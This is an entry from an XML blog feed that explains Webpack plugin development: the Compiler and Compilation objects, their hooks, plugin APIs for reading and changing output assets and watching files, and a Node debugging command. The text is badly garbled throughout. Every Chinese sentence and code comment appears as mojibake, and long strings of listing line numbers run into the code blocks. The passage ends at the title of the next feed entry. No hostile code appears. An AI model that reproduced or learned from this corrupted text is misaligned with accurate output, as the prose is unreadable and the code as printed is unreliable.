å¯¹è±¡åŒ…å«äº†å½“å‰è¿è¡ŒWebpackçš„é…ç½®ï¼ŒåŒ…æ‹¬entryã€outputã€loadersç­‰é…ç½®ï¼Œè¿™ä¸ªå¯¹è±¡åœ¨å¯åŠ¨Webpackæ—¶è¢«å®ä¾‹åŒ–ï¼Œè€Œä¸”æ˜¯å…¨å±€å”¯ä¸€çš„ã€‚Pluginå¯ä»¥é€šè¿‡è¯¥å¯¹è±¡è·å–åˆ°Webpackçš„é…ç½®ä¿¡æ¯è¿›è¡Œå¤„ç†ã€‚ å¦‚æœçœ‹å®Œè¿™æ®µè¯ï¼Œä½ è¿˜æ˜¯æ²¡ç†è§£compileræ˜¯åšå•¥çš„ï¼Œä¸è¦æ€•ï¼Œæ¥ç€çœ‹ã€‚ è¿è¡Œnpm run buildï¼ŒæŠŠcompilerçš„å…¨éƒ¨ä¿¡æ¯è¾“å‡ºåˆ°æ§åˆ¶å°ä¸Šconsole.log(Compiler)ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141// ä¸ºäº†èƒ½æ›´ç›´è§‚çš„è®©å¤§å®¶çœ‹æ¸…æ¥šcompilerçš„ç»“æ„ï¼Œé‡Œé¢çš„å¤§é‡ä»£ç ä½¿ç”¨çœç•¥å·ï¼ˆ...ï¼‰ä»£æ›¿ã€‚Compiler &#123; _pluginCompat: SyncBailHook &#123; ... &#125;, hooks: &#123; shouldEmit: SyncBailHook &#123; ... &#125;, done: AsyncSeriesHook &#123; ... &#125;, additionalPass: AsyncSeriesHook &#123; ... &#125;, beforeRun: AsyncSeriesHook &#123; ... &#125;, run: AsyncSeriesHook &#123; ... &#125;, emit: AsyncSeriesHook &#123; ... &#125;, assetEmitted: AsyncSeriesHook &#123; ... &#125;, afterEmit: AsyncSeriesHook &#123; ... &#125;, thisCompilation: SyncHook &#123; ... &#125;, compilation: SyncHook &#123; ... &#125;, normalModuleFactory: SyncHook &#123; ... &#125;, contextModuleFactory: SyncHook &#123; ... &#125;, beforeCompile: AsyncSeriesHook &#123; ... &#125;, compile: SyncHook &#123; ... &#125;, make: AsyncParallelHook &#123; ... &#125;, afterCompile: AsyncSeriesHook &#123; ... &#125;, watchRun: AsyncSeriesHook &#123; ... &#125;, failed: SyncHook &#123; ... &#125;, invalid: SyncHook &#123; ... &#125;, watchClose: SyncHook &#123; ... &#125;, infrastructureLog: SyncBailHook &#123; ... &#125;, environment: SyncHook &#123; ... &#125;, afterEnvironment: SyncHook &#123; ... &#125;, afterPlugins: SyncHook &#123; ... &#125;, afterResolvers: SyncHook &#123; ... &#125;, entryOption: SyncBailHook &#123; ... &#125;, infrastructurelog: SyncBailHook &#123; ... &#125; &#125;, ... outputPath: '',//è¾“å‡ºç›®å½• outputFileSystem: NodeOutputFileSystem &#123; ... &#125;, inputFileSystem: CachedInputFileSystem &#123; ... &#125;, ... options: &#123; //Compilerå¯¹è±¡åŒ…å«äº†webpackçš„æ‰€æœ‰é…ç½®ä¿¡æ¯ï¼Œentryã€moduleã€outputã€resolveç­‰ä¿¡æ¯ entry: [ 'babel-polyfill', '/Users/frank/Desktop/fe/fe-blog/webpack-plugin/src/index.js' ], devServer: &#123; port: 3000 &#125;, output: &#123; ... &#125;, module: &#123; ... &#125;, plugins: [ MyWebpackPlugin &#123;&#125; ], mode: 'production', context: '/Users/frank/Desktop/fe/fe-blog/webpack-plugin', devtool: false, ... performance: &#123; maxAssetSize: 250000, maxEntrypointSize: 250000, hints: 'warning' &#125;, optimization: &#123; ... &#125;, resolve: &#123; ... &#125;, resolveLoader: &#123; ... &#125;, infrastructureLogging: &#123; level: 'info', debug: false &#125; &#125;, context: '/Users/frank/Desktop/fe/fe-blog/webpack-plugin',//ä¸Šä¸‹æ–‡ï¼Œæ–‡ä»¶ç›®å½• requestShortener: RequestShortener &#123; ... &#125;, ... watchFileSystem: NodeWatchFileSystem &#123; //ç›‘å¬æ–‡ä»¶å˜åŒ–åˆ—è¡¨ä¿¡æ¯ ... &#125;&#125; Compileræºç ç²¾ç®€ç‰ˆä»£ç è§£ææºç åœ°å€(948è¡Œ)ï¼šhttps://github.com/webpack/webpack/blob/master/lib/Compiler.js 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117const &#123; SyncHook, SyncBailHook, AsyncSeriesHook &#125; = require("tapable");class Compiler &#123; constructor() &#123; // 1. å®šä¹‰ç”Ÿå‘½å‘¨æœŸé’©å­ this.hooks = Object.freeze(&#123; // ...åªåˆ—ä¸¾å‡ ä¸ªå¸¸ç”¨çš„å¸¸è§é’©å­ï¼Œæ›´å¤šhookå°±ä¸åˆ—ä¸¾äº†ï¼Œæœ‰å…´è¶£çœ‹æºç  done: new AsyncSeriesHook(["stats"]),//ä¸€æ¬¡ç¼–è¯‘å®Œæˆåæ‰§è¡Œï¼Œå›è°ƒå‚æ•°ï¼šstats beforeRun: new AsyncSeriesHook(["compiler"]), run: new AsyncSeriesHook(["compiler"]),//åœ¨ç¼–è¯‘å™¨å¼€å§‹è¯»å–è®°å½•å‰æ‰§è¡Œ emit: new AsyncSeriesHook(["compilation"]),//åœ¨ç”Ÿæˆæ–‡ä»¶åˆ°outputç›®å½•ä¹‹å‰æ‰§è¡Œï¼Œå›è°ƒå‚æ•°ï¼š compilation afterEmit: new AsyncSeriesHook(["compilation"]),//åœ¨ç”Ÿæˆæ–‡ä»¶åˆ°outputç›®å½•ä¹‹åæ‰§è¡Œ compilation: new SyncHook(["compilation", "params"]),//åœ¨ä¸€æ¬¡compilationåˆ›å»ºåæ‰§è¡Œæ’ä»¶ beforeCompile: new AsyncSeriesHook(["params"]), compile: new SyncHook(["params"]),//åœ¨ä¸€ä¸ªæ–°çš„compilationåˆ›å»ºä¹‹å‰æ‰§è¡Œ make:new AsyncParallelHook(["compilation"]),//å®Œæˆä¸€æ¬¡ç¼–è¯‘ä¹‹å‰æ‰§è¡Œ afterCompile: new AsyncSeriesHook(["compilation"]), watchRun: new AsyncSeriesHook(["compiler"]), failed: new SyncHook(["error"]), watchClose: new SyncHook([]), afterPlugins: new SyncHook(["compiler"]), entryOption: new SyncBailHook(["context", "entry"]) &#125;); // ...çœç•¥ä»£ç  &#125; newCompilation() &#123; // åˆ›å»ºCompilationå¯¹è±¡å›è°ƒcompilationç›¸å…³é’©å­ const compilation = new Compilation(this); //...ä¸€ç³»åˆ—æ“ä½œ this.hooks.compilation.call(compilation, params); //compilationå¯¹è±¡åˆ›å»ºå®Œæˆ return compilation &#125; watch() &#123; //å¦‚æœè¿è¡Œåœ¨watchæ¨¡å¼åˆ™æ‰§è¡Œwatchæ–¹æ³•ï¼Œå¦åˆ™æ‰§è¡Œrunæ–¹æ³• if (this.running) &#123; return handler(new ConcurrentCompilationError()); &#125; this.running = true; this.watchMode = true; return new Watching(this, watchOptions, handler); &#125; run(callback) &#123; if (this.running) &#123; return callback(new ConcurrentCompilationError()); &#125; this.running = true; process.nextTick(() =&gt; &#123; this.emitAssets(compilation, err =&gt; &#123; if (err) &#123; // åœ¨ç¼–è¯‘å’Œè¾“å‡ºçš„æµç¨‹ä¸­é‡åˆ°å¼‚å¸¸æ—¶ï¼Œä¼šè§¦å‘ failed äº‹ä»¶ this.hooks.failed.call(err) &#125;; if (compilation.hooks.needAdditionalPass.call()) &#123; // ... // doneï¼šå®Œæˆç¼–è¯‘ this.hooks.done.callAsync(stats, err =&gt; &#123; // åˆ›å»ºcompilationå¯¹è±¡ä¹‹å‰ this.compile(onCompiled); &#125;); &#125; this.emitRecords(err =&gt; &#123; this.hooks.done.callAsync(stats, err =&gt; &#123; &#125;); &#125;); &#125;); &#125;); this.hooks.beforeRun.callAsync(this, err =&gt; &#123; this.hooks.run.callAsync(this, err =&gt; &#123; this.readRecords(err =&gt; &#123; this.compile(onCompiled); &#125;); &#125;); &#125;); &#125; compile(callback) &#123; const params = this.newCompilationParams(); this.hooks.beforeCompile.callAsync(params, err =&gt; &#123; this.hooks.compile.call(params); const compilation = this.newCompilation(params); //è§¦å‘makeäº‹ä»¶å¹¶è°ƒç”¨addEntryï¼Œæ‰¾åˆ°å…¥å£jsï¼Œè¿›è¡Œä¸‹ä¸€æ­¥ this.hooks.make.callAsync(compilation, err =&gt; &#123; process.nextTick(() =&gt; &#123; compilation.finish(err =&gt; &#123; // å°è£…æ„å»ºç»“æœï¼ˆsealï¼‰ï¼Œé€æ¬¡å¯¹æ¯ä¸ªmoduleå’Œchunkè¿›è¡Œæ•´ç†ï¼Œæ¯ä¸ªchunkå¯¹åº”ä¸€ä¸ªå…¥å£æ–‡ä»¶ compilation.seal(err =&gt; &#123; this.hooks.afterCompile.callAsync(compilation, err =&gt; &#123; // å¼‚æ­¥çš„äº‹ä»¶éœ€è¦åœ¨æ’ä»¶å¤„ç†å®Œä»»åŠ¡æ—¶è°ƒç”¨å›è°ƒå‡½æ•°é€šçŸ¥ Webpack è¿›å…¥ä¸‹ä¸€ä¸ªæµç¨‹ï¼Œ // ä¸ç„¶è¿è¡Œæµç¨‹å°†ä¼šä¸€ç›´å¡åœ¨è¿™ä¸å¾€ä¸‹æ‰§è¡Œ return callback(null, compilation); &#125;); &#125;); &#125;); &#125;); &#125;); &#125;); &#125; emitAssets(compilation, callback) &#123; const emitFiles = (err) =&gt; &#123; //...çœç•¥ä¸€ç³»åˆ—ä»£ç  // afterEmitï¼šæ–‡ä»¶å·²ç»å†™å…¥ç£ç›˜å®Œæˆ this.hooks.afterEmit.callAsync(compilation, err =&gt; &#123; if (err) return callback(err); return callback(); &#125;); &#125; // emit äº‹ä»¶å‘ç”Ÿæ—¶ï¼Œå¯ä»¥è¯»å–åˆ°æœ€ç»ˆè¾“å‡ºçš„èµ„æºã€ä»£ç å—ã€æ¨¡å—åŠå…¶ä¾èµ–ï¼Œå¹¶è¿›è¡Œä¿®æ”¹(è¿™æ˜¯æœ€åä¸€æ¬¡ä¿®æ”¹æœ€ç»ˆæ–‡ä»¶çš„æœºä¼š) this.hooks.emit.callAsync(compilation, err =&gt; &#123; if (err) return callback(err); outputPath = compilation.getPath(this.outputPath, &#123;&#125;); mkdirp(this.outputFileSystem, outputPath, emitFiles); &#125;); &#125; // ...çœç•¥ä»£ç &#125; applyæ–¹æ³•ä¸­æ’å…¥é’©å­çš„ä¸€èˆ¬å½¢å¼å¦‚ä¸‹ï¼š 12345// compileræä¾›äº†compiler.hooksï¼Œå¯ä»¥æ ¹æ®è¿™äº›ä¸åŒçš„æ—¶åˆ»å»è®©æ’ä»¶åšä¸åŒçš„äº‹æƒ…ã€‚compiler.hooks.é˜¶æ®µ.tapå‡½æ•°('æ’ä»¶åç§°', (é˜¶æ®µå›è°ƒå‚æ•°) =&gt; &#123;&#125;);compiler.run(callback) ç†è§£CompilationCompilationå¯¹è±¡ä»£è¡¨äº†ä¸€æ¬¡èµ„æºç‰ˆæœ¬æ„å»ºã€‚å½“è¿è¡Œ webpack å¼€å‘ç¯å¢ƒä¸­é—´ä»¶æ—¶ï¼Œæ¯å½“æ£€æµ‹åˆ°ä¸€ä¸ªæ–‡ä»¶å˜åŒ–ï¼Œå°±ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„ compilationï¼Œä»è€Œç”Ÿæˆä¸€ç»„æ–°çš„ç¼–è¯‘èµ„æºã€‚ä¸€ä¸ª Compilation å¯¹è±¡è¡¨ç°äº†å½“å‰çš„æ¨¡å—èµ„æºã€ç¼–è¯‘ç”Ÿæˆèµ„æºã€å˜åŒ–çš„æ–‡ä»¶ã€ä»¥åŠè¢«è·Ÿè¸ªä¾èµ–çš„çŠ¶æ€ä¿¡æ¯ï¼Œç®€å•æ¥è®²å°±æ˜¯æŠŠæœ¬æ¬¡æ‰“åŒ…ç¼–è¯‘çš„å†…å®¹å­˜åˆ°å†…å­˜é‡Œã€‚Compilation å¯¹è±¡ä¹Ÿæä¾›äº†æ’ä»¶éœ€è¦è‡ªå®šä¹‰åŠŸèƒ½çš„å›è°ƒï¼Œä»¥ä¾›æ’ä»¶åšè‡ªå®šä¹‰å¤„ç†æ—¶é€‰æ‹©ä½¿ç”¨æ‹“å±•ã€‚ ç®€å•æ¥è¯´,Compilationçš„èŒè´£å°±æ˜¯æ„å»ºæ¨¡å—å’ŒChunkï¼Œå¹¶åˆ©ç”¨æ’ä»¶ä¼˜åŒ–æ„å»ºè¿‡ç¨‹ã€‚ å’Œ Compiler ç”¨æ³•ç›¸åŒï¼Œé’©å­ç±»å‹ä¸åŒï¼Œä¹Ÿå¯ä»¥åœ¨æŸäº›é’©å­ä¸Šè®¿é—® tapAsync å’Œ tapPromiseã€‚ æ§åˆ¶å°è¾“å‡ºconsole.log(compilation) é€šè¿‡ Compilation ä¹Ÿèƒ½è¯»å–åˆ° Compiler å¯¹è±¡ã€‚ æºç 2000å¤šè¡Œï¼Œçœ‹ä¸åŠ¨äº†- -ï¼Œæœ‰å…´è¶£çš„å¯ä»¥è‡ªå·±çœ‹çœ‹ã€‚ https://github.com/webpack/webpack/blob/master/lib/Compilation.js ä»‹ç»å‡ ä¸ªå¸¸ç”¨çš„Compilation Hooks| é’©å­ | ç±»å‹ | ä»€ä¹ˆæ—¶å€™è°ƒç”¨ | |â€”â€”â€”â€”â€”â€”â€”-|â€”â€”â€”â€”â€”â€“|â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”| | buildModule | SyncHook | åœ¨æ¨¡å—å¼€å§‹ç¼–è¯‘ä¹‹å‰è§¦å‘ï¼Œå¯ä»¥ç”¨äºä¿®æ”¹æ¨¡å— | | succeedModule | SyncHook | å½“ä¸€ä¸ªæ¨¡å—è¢«æˆåŠŸç¼–è¯‘ï¼Œä¼šæ‰§è¡Œè¿™ä¸ªé’©å­ | | finishModules | AsyncSeriesHook | å½“æ‰€æœ‰æ¨¡å—éƒ½ç¼–è¯‘æˆåŠŸåè¢«è°ƒç”¨ | | seal | SyncHook | å½“ä¸€æ¬¡compilationåœæ­¢æ¥æ”¶æ–°æ¨¡å—æ—¶è§¦å‘ | | optimizeDependencies | SyncBailHook | åœ¨ä¾èµ–ä¼˜åŒ–çš„å¼€å§‹æ‰§è¡Œ | | optimize | SyncHook | åœ¨ä¼˜åŒ–é˜¶æ®µçš„å¼€å§‹æ‰§è¡Œ | | optimizeModules | SyncBailHook | åœ¨æ¨¡å—ä¼˜åŒ–é˜¶æ®µå¼€å§‹æ—¶æ‰§è¡Œï¼Œæ’ä»¶å¯ä»¥åœ¨è¿™ä¸ªé’©å­é‡Œæ‰§è¡Œå¯¹æ¨¡å—çš„ä¼˜åŒ–ï¼Œå›è°ƒå‚æ•°ï¼šmodules | | optimizeChunks | SyncBailHook | åœ¨ä»£ç å—ä¼˜åŒ–é˜¶æ®µå¼€å§‹æ—¶æ‰§è¡Œï¼Œæ’ä»¶å¯ä»¥åœ¨è¿™ä¸ªé’©å­é‡Œæ‰§è¡Œå¯¹ä»£ç å—çš„ä¼˜åŒ–ï¼Œå›è°ƒå‚æ•°ï¼šchunks | | optimizeChunkAssets | AsyncSeriesHook | ä¼˜åŒ–ä»»ä½•ä»£ç å—èµ„æºï¼Œè¿™äº›èµ„æºå­˜æ”¾åœ¨compilation.assets ä¸Šã€‚ä¸€ä¸ª chunk æœ‰ä¸€ä¸ª files å±æ€§ï¼Œå®ƒæŒ‡å‘ç”±ä¸€ä¸ªchunkåˆ›å»ºçš„æ‰€æœ‰æ–‡ä»¶ã€‚ä»»ä½•é¢å¤–çš„ chunk èµ„æºéƒ½å­˜æ”¾åœ¨ compilation.additionalChunkAssets ä¸Šã€‚å›è°ƒå‚æ•°ï¼šchunks | | optimizeAssets | AsyncSeriesHook | ä¼˜åŒ–æ‰€æœ‰å­˜æ”¾åœ¨ compilation.assets çš„æ‰€æœ‰èµ„æºã€‚å›è°ƒå‚æ•°ï¼šassets | Compiler å’Œ Compilation çš„åŒºåˆ«Compiler ä»£è¡¨äº†æ•´ä¸ª Webpack ä»å¯åŠ¨åˆ°å…³é—­çš„ç”Ÿå‘½å‘¨æœŸï¼Œè€Œ Compilation åªæ˜¯ä»£è¡¨äº†ä¸€æ¬¡æ–°çš„ç¼–è¯‘ï¼Œåªè¦æ–‡ä»¶æœ‰æ”¹åŠ¨ï¼Œcompilationå°±ä¼šè¢«é‡æ–°åˆ›å»ºã€‚ å¸¸ç”¨ APIæ’ä»¶å¯ä»¥ç”¨æ¥ä¿®æ”¹è¾“å‡ºæ–‡ä»¶ã€å¢åŠ è¾“å‡ºæ–‡ä»¶ã€ç”šè‡³å¯ä»¥æå‡ Webpack æ€§èƒ½ã€ç­‰ç­‰ï¼Œæ€»ä¹‹æ’ä»¶é€šè¿‡è°ƒç”¨Webpack æä¾›çš„ API èƒ½å®Œæˆå¾ˆå¤šäº‹æƒ…ã€‚ ç”±äº Webpackæä¾›çš„ API éå¸¸å¤šï¼Œæœ‰å¾ˆå¤š API å¾ˆå°‘ç”¨çš„ä¸Šï¼ŒåˆåŠ ä¸Šç¯‡å¹…æœ‰é™ï¼Œä¸‹é¢æ¥ä»‹ç»ä¸€äº›å¸¸ç”¨çš„ APIã€‚ è¯»å–è¾“å‡ºèµ„æºã€ä»£ç å—ã€æ¨¡å—åŠå…¶ä¾èµ–æœ‰äº›æ’ä»¶å¯èƒ½éœ€è¦è¯»å– Webpack çš„å¤„ç†ç»“æœï¼Œä¾‹å¦‚è¾“å‡ºèµ„æºã€ä»£ç å—ã€æ¨¡å—åŠå…¶ä¾èµ–ï¼Œä»¥ä¾¿åšä¸‹ä¸€æ­¥å¤„ç†ã€‚ åœ¨ emit äº‹ä»¶å‘ç”Ÿæ—¶ï¼Œä»£è¡¨æºæ–‡ä»¶çš„è½¬æ¢å’Œç»„è£…å·²ç»å®Œæˆï¼Œåœ¨è¿™é‡Œå¯ä»¥è¯»å–åˆ°æœ€ç»ˆå°†è¾“å‡ºçš„èµ„æºã€ä»£ç å—ã€æ¨¡å—åŠå…¶ä¾èµ–ï¼Œå¹¶ä¸”å¯ä»¥ä¿®æ”¹è¾“å‡ºèµ„æºçš„å†…å®¹ã€‚ æ’ä»¶ä»£ç å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930class Plugin &#123; apply(compiler) &#123; compiler.plugin('emit', function (compilation, callback) &#123; // compilation.chunks å­˜æ”¾æ‰€æœ‰ä»£ç å—ï¼Œæ˜¯ä¸€ä¸ªæ•°ç»„ compilation.chunks.forEach(function (chunk) &#123; // chunk ä»£è¡¨ä¸€ä¸ªä»£ç å— // ä»£ç å—ç”±å¤šä¸ªæ¨¡å—ç»„æˆï¼Œé€šè¿‡ chunk.forEachModule èƒ½è¯»å–ç»„æˆä»£ç å—çš„æ¯ä¸ªæ¨¡å— chunk.forEachModule(function (module) &#123; // module ä»£è¡¨ä¸€ä¸ªæ¨¡å— // module.fileDependencies å­˜æ”¾å½“å‰æ¨¡å—çš„æ‰€æœ‰ä¾èµ–çš„æ–‡ä»¶è·¯å¾„ï¼Œæ˜¯ä¸€ä¸ªæ•°ç»„ module.fileDependencies.forEach(function (filepath) &#123; &#125;); &#125;); // Webpack ä¼šæ ¹æ® Chunk å»ç”Ÿæˆè¾“å‡ºçš„æ–‡ä»¶èµ„æºï¼Œæ¯ä¸ª Chunk éƒ½å¯¹åº”ä¸€ä¸ªåŠå…¶ä»¥ä¸Šçš„è¾“å‡ºæ–‡ä»¶ // ä¾‹å¦‚åœ¨ Chunk ä¸­åŒ…å«äº† CSS æ¨¡å—å¹¶ä¸”ä½¿ç”¨äº† ExtractTextPlugin æ—¶ï¼Œ // è¯¥ Chunk å°±ä¼šç”Ÿæˆ .js å’Œ .css ä¸¤ä¸ªæ–‡ä»¶ chunk.files.forEach(function (filename) &#123; // compilation.assets å­˜æ”¾å½“å‰æ‰€æœ‰å³å°†è¾“å‡ºçš„èµ„æº // è°ƒç”¨ä¸€ä¸ªè¾“å‡ºèµ„æºçš„ source() æ–¹æ³•èƒ½è·å–åˆ°è¾“å‡ºèµ„æºçš„å†…å®¹ let source = compilation.assets[filename].source(); &#125;); &#125;); // è¿™æ˜¯ä¸€ä¸ªå¼‚æ­¥äº‹ä»¶ï¼Œè¦è®°å¾—è°ƒç”¨ callback é€šçŸ¥ Webpack æœ¬æ¬¡äº‹ä»¶ç›‘å¬å¤„ç†ç»“æŸã€‚ // å¦‚æœå¿˜è®°äº†è°ƒç”¨ callbackï¼ŒWebpack å°†ä¸€ç›´å¡åœ¨è¿™é‡Œè€Œä¸ä¼šå¾€åæ‰§è¡Œã€‚ callback(); &#125;) &#125;&#125; 2ã€ç›‘å¬æ–‡ä»¶å˜åŒ–Webpack ä¼šä»é…ç½®çš„å…¥å£æ¨¡å—å‡ºå‘ï¼Œä¾æ¬¡æ‰¾å‡ºæ‰€æœ‰çš„ä¾èµ–æ¨¡å—ï¼Œå½“å…¥å£æ¨¡å—æˆ–è€…å…¶ä¾èµ–çš„æ¨¡å—å‘ç”Ÿå˜åŒ–æ—¶ï¼Œ å°±ä¼šè§¦å‘ä¸€æ¬¡æ–°çš„ Compilationã€‚ åœ¨å¼€å‘æ’ä»¶æ—¶ç»å¸¸éœ€è¦çŸ¥é“æ˜¯å“ªä¸ªæ–‡ä»¶å‘ç”Ÿå˜åŒ–å¯¼è‡´äº†æ–°çš„ Compilationï¼Œä¸ºæ­¤å¯ä»¥ä½¿ç”¨å¦‚ä¸‹ä»£ç ï¼š 12345678910// å½“ä¾èµ–çš„æ–‡ä»¶å‘ç”Ÿå˜åŒ–æ—¶ä¼šè§¦å‘ watch-run äº‹ä»¶compiler.hooks.watchRun.tap('MyPlugin', (watching, callback) =&gt; &#123; // è·å–å‘ç”Ÿå˜åŒ–çš„æ–‡ä»¶åˆ—è¡¨ const changedFiles = watching.compiler.watchFileSystem.watcher.mtimes; // changedFiles æ ¼å¼ä¸ºé”®å€¼å¯¹ï¼Œé”®ä¸ºå‘ç”Ÿå˜åŒ–çš„æ–‡ä»¶è·¯å¾„ã€‚ if (changedFiles[filePath] !== undefined) &#123; // filePath å¯¹åº”çš„æ–‡ä»¶å‘ç”Ÿäº†å˜åŒ– &#125; callback();&#125;); é»˜è®¤æƒ…å†µä¸‹ Webpack åªä¼šç›‘è§†å…¥å£å’Œå…¶ä¾èµ–çš„æ¨¡å—æ˜¯å¦å‘ç”Ÿå˜åŒ–ï¼Œåœ¨æœ‰äº›æƒ…å†µä¸‹é¡¹ç›®å¯èƒ½éœ€è¦å¼•å…¥æ–°çš„æ–‡ä»¶ï¼Œä¾‹å¦‚å¼•å…¥ä¸€ä¸ª HTML æ–‡ä»¶ã€‚ ç”±äº JavaScript æ–‡ä»¶ä¸ä¼šå»å¯¼å…¥ HTML æ–‡ä»¶ï¼ŒWebpack å°±ä¸ä¼šç›‘å¬ HTML æ–‡ä»¶çš„å˜åŒ–ï¼Œç¼–è¾‘ HTML æ–‡ä»¶æ—¶å°±ä¸ä¼šé‡æ–°è§¦å‘æ–°çš„ Compilationã€‚ ä¸ºäº†ç›‘å¬ HTML æ–‡ä»¶çš„å˜åŒ–ï¼Œæˆ‘ä»¬éœ€è¦æŠŠ HTML æ–‡ä»¶åŠ å…¥åˆ°ä¾èµ–åˆ—è¡¨ä¸­ï¼Œä¸ºæ­¤å¯ä»¥ä½¿ç”¨å¦‚ä¸‹ä»£ç ï¼š 12345compiler.hooks.afterCompile.tap('MyPlugin', (compilation, callback) =&gt; &#123; // æŠŠ HTML æ–‡ä»¶æ·»åŠ åˆ°æ–‡ä»¶ä¾èµ–åˆ—è¡¨ï¼Œå¥½è®© Webpack å»ç›‘å¬ HTML æ¨¡å—æ–‡ä»¶ï¼Œåœ¨ HTML æ¨¡ç‰ˆæ–‡ä»¶å‘ç”Ÿå˜åŒ–æ—¶é‡æ–°å¯åŠ¨ä¸€æ¬¡ç¼–è¯‘ compilation.fileDependencies.push(filePath); callback();&#125;); 3ã€ä¿®æ”¹è¾“å‡ºèµ„æºæœ‰äº›åœºæ™¯ä¸‹æ’ä»¶éœ€è¦ä¿®æ”¹ã€å¢åŠ ã€åˆ é™¤è¾“å‡ºçš„èµ„æºï¼Œè¦åšåˆ°è¿™ç‚¹éœ€è¦ç›‘å¬ emit äº‹ä»¶ï¼Œå› ä¸ºå‘ç”Ÿ emit äº‹ä»¶æ—¶æ‰€æœ‰æ¨¡å—çš„è½¬æ¢å’Œä»£ç å—å¯¹åº”çš„æ–‡ä»¶å·²ç»ç”Ÿæˆå¥½ï¼Œ éœ€è¦è¾“å‡ºçš„èµ„æºå³å°†è¾“å‡ºï¼Œå› æ­¤emitäº‹ä»¶æ˜¯ä¿®æ”¹ Webpack è¾“å‡ºèµ„æºçš„æœ€åæ—¶æœºã€‚ æ‰€æœ‰éœ€è¦è¾“å‡ºçš„èµ„æºä¼šå­˜æ”¾åœ¨ compilation.assets ä¸­ï¼Œcompilation.assets æ˜¯ä¸€ä¸ªé”®å€¼å¯¹ï¼Œé”®ä¸ºéœ€è¦è¾“å‡ºçš„æ–‡ä»¶åç§°ï¼Œå€¼ä¸ºæ–‡ä»¶å¯¹åº”çš„å†…å®¹ã€‚ è®¾ç½® compilation.assets çš„ä»£ç å¦‚ä¸‹ï¼š 12345678910111213// è®¾ç½®åç§°ä¸º fileName çš„è¾“å‡ºèµ„æº compilation.assets[fileName] = &#123; // è¿”å›æ–‡ä»¶å†…å®¹ source: () =&gt; &#123; // fileContent æ—¢å¯ä»¥æ˜¯ä»£è¡¨æ–‡æœ¬æ–‡ä»¶çš„å­—ç¬¦ä¸²ï¼Œä¹Ÿå¯ä»¥æ˜¯ä»£è¡¨äºŒè¿›åˆ¶æ–‡ä»¶çš„ Buffer return fileContent; &#125;, // è¿”å›æ–‡ä»¶å¤§å° size: () =&gt; &#123; return Buffer.byteLength(fileContent, 'utf8'); &#125; &#125;; callback(); åˆ¤æ–­webpackä½¿ç”¨äº†å“ªäº›æ’ä»¶12345678// åˆ¤æ–­å½“å‰é…ç½®ä½¿ç”¨ä½¿ç”¨äº† ExtractTextPluginï¼Œ// compiler å‚æ•°å³ä¸º Webpack åœ¨ apply(compiler) ä¸­ä¼ å…¥çš„å‚æ•°function hasExtractTextPlugin(compiler) &#123; // å½“å‰é…ç½®æ‰€æœ‰ä½¿ç”¨çš„æ’ä»¶åˆ—è¡¨ const plugins = compiler.options.plugins; // å» plugins ä¸­å¯»æ‰¾æœ‰æ²¡æœ‰ ExtractTextPlugin çš„å®ä¾‹ return plugins.find(plugin=&gt;plugin.__proto__.constructor === ExtractTextPlugin) != null;&#125; ä»¥ä¸Š4ç§æ–¹æ³•æ¥æºäºæ–‡ç« ï¼š [Webpackå­¦ä¹ ï¼Plugin] :http://wushaobin.top/2019/03/15/webpackPlugin/ ç®¡ç† Warnings å’Œ Errorsåšä¸€ä¸ªå®éªŒï¼Œå¦‚æœä½ åœ¨ applyå‡½æ•°å†…æ’å…¥ throw new Error(&quot;Message&quot;)ï¼Œä¼šå‘ç”Ÿä»€ä¹ˆï¼Œç»ˆç«¯ä¼šæ‰“å°å‡º Unhandled rejection Error: Messageã€‚ç„¶å webpack ä¸­æ–­æ‰§è¡Œã€‚ ä¸ºäº†ä¸å½±å“ webpack çš„æ‰§è¡Œï¼Œè¦åœ¨ç¼–è¯‘æœŸé—´å‘ç”¨æˆ·å‘å‡ºè­¦å‘Šæˆ–é”™è¯¯æ¶ˆæ¯ï¼Œåˆ™åº”ä½¿ç”¨ compilation.warnings å’Œ compilation.errorsã€‚ 12compilation.warnings.push("warning");compilation.errors.push("error"); æ–‡ç« ä¸­çš„æ¡ˆä¾‹demoä»£ç å±•ç¤ºhttps://github.com/6fedcom/fe-blog/tree/master/webpack/plugin webpackæ‰“åŒ…è¿‡ç¨‹æˆ–è€…æ’ä»¶ä»£ç é‡Œè¯¥å¦‚ä½•è°ƒè¯•ï¼Ÿ åœ¨å½“å‰webpacké¡¹ç›®å·¥ç¨‹æ–‡ä»¶å¤¹ä¸‹é¢ï¼Œæ‰§è¡Œå‘½ä»¤è¡Œï¼š 1node --inspect-brk ./node_modules/webpack/bin/webpack.js --inline --progress å…¶ä¸­å‚æ•°â€“inspect-brkå°±æ˜¯ä»¥è°ƒè¯•æ¨¡å¼å¯åŠ¨nodeï¼š ç»ˆç«¯ä¼šè¾“å‡ºï¼š 12Debugger listening on ws://127.0.0.1:9229/1018c03f-7473-4d60-b62c-949a6404c81dFor help, see: https://nodejs.org/en/docs/inspector è°·æ­Œæµè§ˆå™¨è¾“å…¥ chrome://inspect/#devices ç„¶åç‚¹ä¸€ä¸‹Chromeè°ƒè¯•å™¨é‡Œçš„â€œç»§ç»­æ‰§è¡Œâ€ï¼Œæ–­ç‚¹å°±æç•™åœ¨æˆ‘ä»¬è®¾ç½®åœ¨æ’ä»¶é‡Œçš„debuggeræ–­ç‚¹äº†ã€‚]]></content>
      <categories>
        <category>Webå‰ç«¯</category>
      </categories>
      <tags>
        <tag>Webpack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[é˜¿é‡Œäº‘å¼€æ”¾å¹³å°å¾®å‰ç«¯æ–¹æ¡ˆçš„æ²™ç®±å®ç°]]></title>
